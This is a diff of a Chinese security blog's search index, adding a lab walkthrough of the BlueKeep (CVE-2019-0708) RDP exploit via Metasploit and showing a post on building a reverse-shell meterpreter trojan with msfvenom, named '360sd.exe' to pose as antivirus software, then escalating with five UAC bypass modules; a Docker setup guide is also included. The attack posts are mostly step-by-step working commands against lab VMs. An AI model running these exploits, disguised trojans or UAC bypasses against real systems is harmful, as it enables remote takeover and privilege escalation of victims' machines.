@@ -1,6 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[CVE-2019-0708复现]]></title>
+    <url>%2FCVE-2019-0708%2F</url>
+    <content type="text"><![CDATA[1前言 2准备工作 3复现过程 一. 前言1. 关于CVE-2019-0708CVE-2019-0708这个漏洞从5月多发布出来之后可以说一直引起了广泛的关注，几乎整个安全行业的人都在关注着他的发展。这两天exp发布出来之后更是引起了极大的反响，感觉所有人都在说这个东西。这篇文章就简单的说一下这个漏洞还有最新的exp，以及复现的过程。 这个漏洞涵盖了windows7及以下的所有版本，覆盖范围相当的广，危害及其严重。原理可以简单的认为是修改内存内容，执行恶意请求，具体的原理有很多大佬都有分析，就不丢人了。 二. 准备工作1. 复现环境 攻击机 kali Linux （内置msf） 靶机 Windows 7 ultimate sp1 x64 2. 准备工作2.1 更新系统和msf这个就不用多说了吧，一行命令就完了，速度慢的记得换源。 2.2 导入exp先从网上下载exp包，然后把里面的东西导入对应的目录，我的msf目录是/usr/share/metasploit-framework 1234rdp.rb -&gt; /usr/share/metasploit-framework/modules/exploit/windows/rdp/rdp.rbrdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb 有的目录没有的创建一个就行了，记得修改一下权限644，不过不改好像也没事。 三. 复现过程1. 启动msf12/etc/init.d/postgresql startmsfconsole 2. 重新加载exp文件1reload_all 3. 加载攻击模块1use exploit/windows/rdp/cve_2019_0708_bluekeep_rce 4. 设置攻击参数123set rhost 192.168.242.131set target 3 #因为我的靶机是VMware虚拟机，所以这里选择3，具体选择什么可以输入info查看提示show options #确认攻击参数 5. 攻击输入exploit开始攻击，如下则攻击成功，可以看到是system权限 至此攻击复现已经完成，可以看到还是很强的，而且靶机是没有任何交互和提示的，悄无声息的就完成了攻击，不得不说大佬还是大佬。 参考 0708MSF攻击套件安装 CVE-2019-0708远程桌面代码执行漏洞复现 【合天网安实验室】Demo-BlueKeep（CVE-2019-0708）漏洞验证演示]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Metasploit</tag>
+        <tag>CVE-2019-0708</tag>
+        <tag>RDP</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Metasploit生成木马文件获取shell和UAC提权操作]]></title>
     <url>%2Fmeterpreter-UACgetSystem%2F</url>
     <content type="text"><![CDATA[前言 攻击环境 获取shell UAC提权 一. 前言前段时间有做过一次内核提权的尝试，不过没有成功，主要还是权限控制的比较严格，并且该打的补丁都打了。但是方法还是有用的，还有就是思路流程总结一下。 二. 攻击环境 攻击机：kali Linux 2019.1 IP：192.168.28.156 靶机：Windows7 ultimate sp1 IP：192.168.28.138 三. 获取shell3.1 生成木马首先启动msf数据库 12/etc/init.d/postgresql startmsfdb init 生成木马 123456msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.156 lport=8585 -f exe -o 360sd.exe-p 选用什么payloadlhost 监听iplport 监听端口-f 生成文件的类型 3.2 启用MSF监听123456use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow options //查看那些参数是需要输入的set lhost 192.168.28.156 //设置监听的IPset lport 8585 //设置监听的端口run/exploit 3.3 投放木马并运行3.4 获取shell 四. UAC提权在获取到shell之后，可以先测试一下命令测试权限 12getsystemgetuid 如果你没有系统/管理员权限，那么你就需要绕过目标系统的UAC保护。 输入background将获取到的会话转入后台，更换其他exp进行提权操作。 4.1 Windows升级UAC保护绕过此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。 123msf &gt; use exploit/windows/local/bypassuacmsf exploit windows/local/bypassuac) &gt; set session 1msf exploit(windows/local/bypassuac) &gt; exploit 从下图可以看到，又建立了一个meterpreter会话2连接，现在输入getsystem和getuid两条命令来查看系统权限： 4.2 Windows升级UAC保护绕过（内存注入）此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块使用反射DLL注入技术仅删除DLLpayload二进制文件而不是删除标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构（对于SYSWOW64系统也使用x64）。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_injectionmsf exploit(windows/local/bypassuac_injection) &gt; set session 1msf exploit(windows/local/bypassuac_injection) &gt; exploit 从下图中可以看出，meterpreter 会话2已经成功打开，现在输入getsystem和getuid两条命令来查看权限 4.3 Windows升级UAC保护绕过（FodHelper注册表键值绕过）此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_fodhelpermsf exploit(windows/local/bypassuac_fodhelper) &gt; set session 1msf exploit(windows/local/bypassuac_fodhelper) &gt; exploit 4.4 Windows升级UAC保护绕过（Eventvwr注册表键值绕过）此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入自定义命令，这个命令将在启动Windows fodhelper.exe应用程序时调用来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_eventvwrmsf exploit(windows/local/bypassuac_eventvwr) &gt; set session 1msf exploit(windows/local/bypassuac_eventvwr) &gt; exploit 4.5 Windows升级UAC保护绕过（COM Handler劫持绕过）此模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。加载某些高完整性进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话升级的payload。在payload调用后清除注册表项修改。此模块要求payload的体系结构与OS匹配，但当前的低权限Meterpreter会话的体系结构并不相同。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果限制cmd.exe访问，则此模块将无法正常运行。 123msf &gt; use exploit/windows/local/bypassuac_comhijackmsf exploit(windows/local/bypassuac_comhijack) &gt; set session 1msf exploit(windows/local/bypassuac_comhijack) &gt; exploit 参考：利用metasploit绕过UAC的5种方式]]></content>
@@ -8,10 +22,10 @@
         <category>攻击测试</category>
       </categories>
       <tags>
+        <tag>Metasploit</tag>
         <tag>kali Linux</tag>
         <tag>攻击测试</tag>
         <tag>木马攻击</tag>
-        <tag>Metasploit</tag>
         <tag>UAC提权</tag>
       </tags>
   </entry>
@@ -91,7 +105,7 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[ubuntu16.04安装python3.7和docker]]></title>
+    <title><![CDATA[Ubuntu16.04安装python3.7和docker]]></title>
     <url>%2Fubuntu16-04-python3-7-docker%2F</url>
     <content type="text"><![CDATA[什么是docker 安装python3.7 搭建docker环境 一. 什么是dockerDocker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化，容器是完全使用沙箱机制，相互之间不会有任何接口。 一个完整的Docker有以下几个部分组成： DockerClient客户端 Docker Daemon守护进程 Docker Image镜像 DockerContainer容器 二. 安装python3.7本次python3.7使用源码安装 1. 安装环境123sudo apt-get install zlib1g-dev libbz2-dev libssl-dev libncurses5-dev libsqlite3-dev libreadline-dev tk-dev libgdbm-dev libdb-dev libpcap-dev xz-utils libexpat1-dev liblzma-dev libffi-dev libc6-dev 2. 源码安装2.1下载源码包从官网下载最新版本源码包并解压 2.2 建立安装目录1sudo mkdir -p /usr/local/python3.7 2.3 编译安装进入源码包目录下，使用如下命令 123./configure --prefix=/usr/local/python3.7 --enable-optimizationsmakesudo make install 如果编译过程中出现如下问题 123ModuleNotFoundError: No module named &apos;_ctypes&apos;Makefile:1130: recipe for target &apos;install&apos; failedmake: *** [install] Error 可以使用如下方法解决 12345678sudo apt-get updatesudo apt-get upgradesudo apt-get dist-upgradesudo apt-get install build-essential python-dev python-setuptools python-pip python-smbussudo apt-get install build-essential libncursesw5-dev libgdbm-dev libc6-devsudo apt-get install zlib1g-dev libsqlite3-dev tk-devsudo apt-get install libssl-dev opensslsudo apt-get install libffi-dev 3 添加软连接1234#添加python3的软链接ln -s /usr/local/python3/bin/python3.7 /usr/bin/python3.7#添加 pip3 的软链接ln -s /usr/local/python3/bin/pip3.7 /usr/bin/pip3.7 4 检测版本12python3.7 -Vpip3.7 -V 二. 搭建docker环境1.安装docker1.1 安装1sudo curl -s https://get.docker.com/ | sh 如果提示没有curl，可以按照提示安装curl，不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。 1.2 几个遇到的问题1) 123E: Failed to fetch https://download.docker.com/linux/ubuntu/dists/xenial/pool/stable/amd64/containerd.io_1.2.5-1_amd64.deb Operation too slow. Less than 10 bytes/sec transferred the last 120 secondsE: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing? 这是网络问题，挂个梯子就行了 2) 1E: Sub-process /usr/bin/dpkg returned an error code (1) 使用如下命令解决 12sudo apt-get update --fix-missingsudo apt-get autoremove &amp;&amp; sudo apt-get clean &amp;&amp; sudo apt-get install -f 2. 安装docker-compose2.1 安装使用刚刚安装的python3.7自带的pip3安装 1pip3 install docker-compose --user 2.2 添加软连接安装完成后使用如下命令查看安装位置 1pip3 show docker-compose 显示如下结果 12345678910Name: docker-composeVersion: 1.24.0Summary: Multi-container orchestration for DockerHome-page: https://www.docker.com/Author: Docker, Inc.Author-email: NoneLicense: Apache License 2.0Location: /home/cheng/.local/lib/python3.7/site-packagesRequires: docopt, dockerpty, PyYAML, jsonschema, requests, docker, texttable, websocket-client, cached-property, sixRequired-by: Location一项即是docker-compose的安装路径，使用如下命令为docker-compose创建软连接 1sudo ln -s /home/cheng/.local/bin/docker-compose /usr/bin/ 3. docker使用3.1 添加加速使用DaoCloud为docker进行加速 1curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io 3.2 docker镜像操作1234docker search mysql //搜索docker pull 镜像名称 //下载docker images //查看本地已下载镜像docker rmi 镜像id //删除镜像 3.3 docker容器操作123456789101112docker run -d -p --name 容器名或镜像ID）-d 后台运行-p 随机分配端口-p 端口1（宿主机）:端口2（容器中）//端口转发docker ps //查看当前处于运行状态的容器docker start 容器ID或容器名 //开启容器docker stop 容器ID或容器名 //停止运行中的容器docker ps -a //查看停止的容器docker rm 容器ID或容器名 //删除容器docker exec -it 容器ID或容器名 /bin/bash //进入容器内部docker save 容器名/容器ID &gt; test.tar //导出容器docker load &lt; test.tar //导入容器]]></content>
       <categories>
@@ -126,10 +140,10 @@
         <category>攻击测试</category>
       </categories>
       <tags>
+        <tag>Metasploit</tag>
         <tag>kali Linux</tag>
         <tag>攻击测试</tag>
         <tag>Ettercap</tag>
-        <tag>Metasploit</tag>
         <tag>browser_autopwn2</tag>
       </tags>
   </entry>
@@ -288,11 +302,11 @@
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>Nmap</tag>
         <tag>Metasploit</tag>
+        <tag>漏洞复现</tag>
+        <tag>Nmap</tag>
         <tag>ms17-010</tag>
         <tag>永恒之蓝</tag>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
